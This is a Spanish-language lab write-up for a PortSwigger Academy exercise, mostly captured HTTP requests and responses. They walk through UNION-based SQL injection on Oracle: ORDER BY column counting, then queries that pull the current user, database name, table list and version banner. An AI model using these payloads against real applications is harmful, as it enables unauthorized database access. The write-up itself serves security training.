---
description: >-
  https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle
---

# Lab 3: SQL injection attack, querying the database type and version on Oracle

Luego de capturar el trafico, se detecta la siguiente peticion:

```
GET /filter?category=Tech+gifts HTTP/2
Host: 0a5500cc030cf30a838bb93b00dc00d5.web-security-academy.net
Cookie: session=BjDxPa9TktzU2kJyplmXyadpEL2tb7sD
Sec-Ch-Ua: "Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: es-CO
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a5500cc030cf30a838bb93b00dc00d5.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```

Lo anterior responde con:

```
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 9239

<!DOCTYPE html>
<html>
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
        <title>SQL injection attack, querying the database type and version on Oracle</title>
    </head>
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>SQL injection attack, querying the database type and version on Oracle</h2>
                            <a id='lab-link' class='button' href='/'>Back to lab home</a>
                            <p id="hint">Make the database retrieve the strings: 'Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production, PL/SQL Release 11.2.0.2.0 - Production, CORE	11.2.0.2.0	Production, TNS for Linux: Version 11.2.0.2.0 - Production, NLSRTL Version 11.2.0.2.0 - Production'</p>
                            <a class=link-back href='https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle'>
                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <div theme="ecommerce">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="ecoms-pageheader">
                        <img src="/resources/images/shop.svg">
                    </section>
                    <section class="ecoms-pageheader">
                        <h1>Tech gifts</h1>
                    </section>
                    <section class="search-filters">
                        <label>Refine your search:</label>
                        <a class="filter-category" href="/">All</a>
                        <a class="filter-category" href="/filter?category=Corporate+gifts">Corporate gifts</a>
                        <a class="filter-category" href="/filter?category=Food+%26+Drink">Food & Drink</a>
                        <a class="filter-category" href="/filter?category=Gifts">Gifts</a>
                        <a class="filter-category" href="/filter?category=Lifestyle">Lifestyle</a>
                        <a class="filter-category selected" href="/filter?category=Tech+gifts">Tech gifts</a>
                    </section>
                    <table class="is-table-longdescription">
                        <tbody>
                        <tr>
                            <th>All-in-One Typewriter</th>
                            <td>This All-in-One compact and portable typewriter is on every writer&apos;s wish list. No need for separate bulky printers, just feed the paper in with the handy rolling thing and create print in seconds.
This is a must-have gadget for all those who like to print on the go. Its revolutionary instant print mechanism saves you time and money, you no longer need to take your memory stick to the nearest printing outlet, you can type and print at the same time. It is a space saving dream.
You need not fear if you are a clumsy typist, all mistakes can quickly be &apos;whited&apos; out with the accompanying bottle of corrective fluid, just apply, blow, and away you go. Every letter of the alphabet is inscribed on the keys making it useful for all your writing needs, numbers are also available especially useful if you need to type up your backlog of invoices.
This handy little device comes with a carrying case, and convenient handle weighing in at only 15 pounds. The mobile office has just got that little bit easier.</td>
                        </tr>
                        <tr>
                            <th>Photobomb Backdrops</th>
                            <td>These backdrops are brought to you in collaboration with our sister company InstaCam. InstaCam is the full package for your social media fake lives. Now you can purchase these add-ons to boost your profile between InstaCam photoshoots.
No technical experience is necessary. The backdrops form part of a software photo suite that can paste you in any pose onto the selected backdrop. Spice up your life with thousands of hilarious photobombing scenarios.
If you would prefer to take your own photos against a painted canvas, and not bother yourself with digital wizardry we can supply you with everything you need. You must be advised the canvases are pretty big and will take up an extraordinary amount of space in your home. Be selective. There is a big second-hand market for these frames, so you can always sell them on, or add to your existing decor with a brand new, exotic, art collection.
We have had incredible feedback for this product, and have been reliably informed that the frames are fully recyclable and have been used in a wide range of DIY projects. Be the envy of your friends and family as they witness your exploits running with photobombing wild horses or apparently dancing with a giraffe (this one is a particularly large canvas). What are you waiting for? Be the person you really want to be today!</td>
                        </tr>
                        <tr>
                            <th>Grow Your Own Spy Kit</th>
                            <td>Everyone is getting wise to the nanny cams, and the old fashioned ways of listening in on other people&apos;s conversations. No-one trusts a cute looking teddy bear anymore, who knows what is hidden behind those button eyes. We have designed a foolproof system that will never catch you out with our &apos;Grow Your Own Spy Kit&apos;.
In the same easy way you plant a seed, or seedling, you pop the water-resistant bug beneath the surface of some fresh compost. With regular watering and a sprinkling of plant food, your bug pots will thrive until they are ready to be gifted to those you wish to spy on.
No-one will suspect what you&apos;re up to, even if they have their suspicions, the only bugs they are going to find hiding amongst the leaves will be greenfly.
On purchasing our &apos;Grow Your Own Spy Kit&apos; you will be required to sign a Non-Disclosure Agreement, loose lips cost lives you know.
Whether you are planning on just having a bit of fun with your family and friends, or you are a serious spy in the making, eavesdropping could not be any easier.</td>
                        </tr>
                        <tr>
                            <th>Eye Projectors</th>
                            <td>Are you one of those people who have very vivid dreams worthy of sharing with everyone you know? Do you lack the imagination to describe what you&apos;ve seen? With extensive research and exhaustive trials our team of Ophthalmologists, and techy peeps, have made it possible for you to share everything that is going on inside your head.
If you think laser eye surgery is advanced you haven&apos;t seen anything yet. A small implant behind the lens of your eyes links to the thalamus and cortex, transmitting images that can be projected in the blink of an eye.
With sufficient training, it is even possible for you to learn to sleep with your eyes open. Then you can entertain family and friends to a unique movie night like they have never experienced before. Forget Netflix, no subscription required here.
The quality of projected images works better with blue eyes, therefore, we envisage altering most eye colors in order for you to experience the best we know you deserve.
The process from start to finish is probably cheaper than you will be expecting. You have nothing to lose by booking a free consultation today.</td>
                        </tr>
                        </tbody>
                    </table>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>

```

Y procedemos a realizar inyecciones utilizando ORDER:

```
GET /filter?category='+order+by+1-- HTTP/2
Host: 0a5500cc030cf30a838bb93b00dc00d5.web-security-academy.net
Cookie: session=BjDxPa9TktzU2kJyplmXyadpEL2tb7sD
Sec-Ch-Ua: "Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: es-CO
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a5500cc030cf30a838bb93b00dc00d5.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```

Con el payload `'+order+by+1--` logramos obtener la siguiente respuesta:

```
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 4090

```

Incrementamos el valor: `'+order+by+2--`

```
GET /filter?category='+order+by+2-- HTTP/2
Host: 0a5500cc030cf30a838bb93b00dc00d5.web-security-academy.net
Cookie: session=BjDxPa9TktzU2kJyplmXyadpEL2tb7sD
Sec-Ch-Ua: "Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: es-CO
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a5500cc030cf30a838bb93b00dc00d5.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```

Y obtenemos:

```
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 4090
```

Y finalizamos con:`'+order+by+3--`

```
GET /filter?category='+order+by+3-- HTTP/2
Host: 0a5500cc030cf30a838bb93b00dc00d5.web-security-academy.net
Cookie: session=BjDxPa9TktzU2kJyplmXyadpEL2tb7sD
Sec-Ch-Ua: "Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: es-CO
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a5500cc030cf30a838bb93b00dc00d5.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```

Lo anterior da como respuesta

```
HTTP/2 500 Internal Server Error
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 2726

```

Por lo anterior, podemos deducir que solo tenemos 2 columnas.

Asi que procedemos a utilizar UNION:

```
GET /filter?category='+UNION+SELECT+NULL,NULL+FROM+dual-- HTTP/2
Host: 0a5500cc030cf30a838bb93b00dc00d5.web-security-academy.net
Cookie: session=BjDxPa9TktzU2kJyplmXyadpEL2tb7sD
Sec-Ch-Ua: "Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: es-CO
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a5500cc030cf30a838bb93b00dc00d5.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```

Lo anterior responde:

```html
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 4171

<!DOCTYPE html>
<html>
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
        <title>SQL injection attack, querying the database type and version on Oracle</title>
    </head>
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>SQL injection attack, querying the database type and version on Oracle</h2>
                            <a id='lab-link' class='button' href='/'>Back to lab home</a>
                            <p id="hint">Make the database retrieve the strings: 'Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production, PL/SQL Release 11.2.0.2.0 - Production, CORE	11.2.0.2.0	Production, TNS for Linux: Version 11.2.0.2.0 - Production, NLSRTL Version 11.2.0.2.0 - Production'</p>
                            <a class=link-back href='https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle'>
                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <div theme="ecommerce">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="ecoms-pageheader">
                        <img src="/resources/images/shop.svg">
                    </section>
                    <section class="ecoms-pageheader">
                        <h1>&apos; UNION SELECT NULL,NULL FROM dual--</h1>
                    </section>
                    <section class="search-filters">
                        <label>Refine your search:</label>
                        <a class="filter-category" href="/">All</a>
                        <a class="filter-category" href="/filter?category=Corporate+gifts">Corporate gifts</a>
                        <a class="filter-category" href="/filter?category=Food+%26+Drink">Food & Drink</a>
                        <a class="filter-category" href="/filter?category=Gifts">Gifts</a>
                        <a class="filter-category" href="/filter?category=Lifestyle">Lifestyle</a>
                        <a class="filter-category" href="/filter?category=Tech+gifts">Tech gifts</a>
                    </section>
                    <table class="is-table-longdescription">
                        <tbody>
                        <tr>
                        </tr>
                        </tbody>
                    </table>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>

```

Procedemos a validar el tipo de dato por cada campo:

```
GET /filter?category='+UNION+SELECT+'Spartan','Cybersecurity'+FROM+dual-- HTTP/2
Host: 0a5500cc030cf30a838bb93b00dc00d5.web-security-academy.net
Cookie: session=BjDxPa9TktzU2kJyplmXyadpEL2tb7sD
Sec-Ch-Ua: "Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: es-CO
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a5500cc030cf30a838bb93b00dc00d5.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```

Lo anterior responde asi:

<figure><img src="../.gitbook/assets/image (12) (1) (1).png" alt=""><figcaption></figcaption></figure>

Lo anterior demuestra que los campos son de tipo STRING.

Asi que podriamos imprimir el usuario actual con el payload: `'+UNION+SELECT+user,'Cybersecurity'+FROM+dual--`

```
GET /filter?category='+UNION+SELECT+user,'Cybersecurity'+FROM+dual-- HTTP/2
Host: 0a5500cc030cf30a838bb93b00dc00d5.web-security-academy.net
Cookie: session=BjDxPa9TktzU2kJyplmXyadpEL2tb7sD
Sec-Ch-Ua: "Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: es-CO
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a5500cc030cf30a838bb93b00dc00d5.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```

Y esto respondio que el usuario era PETER:

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ahora utilizaremos el siguiente payload para obtener el nombre de la base de datos:

`'+UNION+SELECT+user,'Cybersecurity'+FROM+dual--`

```
GET /filter?category='+UNION+SELECT+sys.database_name,'Cybersecurity'+FROM+dual-- HTTP/2
Host: 0a5500cc030cf30a838bb93b00dc00d5.web-security-academy.net
Cookie: session=BjDxPa9TktzU2kJyplmXyadpEL2tb7sD
Sec-Ch-Ua: "Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: es-CO
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a5500cc030cf30a838bb93b00dc00d5.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```

Y esto entrego la siguiente respuesta:

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Para identificar las tablas podriamos ejecutar lo siguiente:

```
GET /filter?category='+UNION+SELECT+table_name,+NULL+FROM+all_tables-- HTTP/2
Host: 0a5500cc030cf30a838bb93b00dc00d5.web-security-academy.net
Cookie: session=BjDxPa9TktzU2kJyplmXyadpEL2tb7sD
Sec-Ch-Ua: "Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: es-CO
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a5500cc030cf30a838bb93b00dc00d5.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```

Y esto respondera:

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Y tambien podriamos consultar la version de la BD:

```
GET /filter?category='+UNION+SELECT+BANNER,+NULL+FROM+v$version-- HTTP/2
Host: 0a5500cc030cf30a838bb93b00dc00d5.web-security-academy.net
Cookie: session=BjDxPa9TktzU2kJyplmXyadpEL2tb7sD
Sec-Ch-Ua: "Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: es-CO
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a5500cc030cf30a838bb93b00dc00d5.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```

Y esto responderia:

<figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
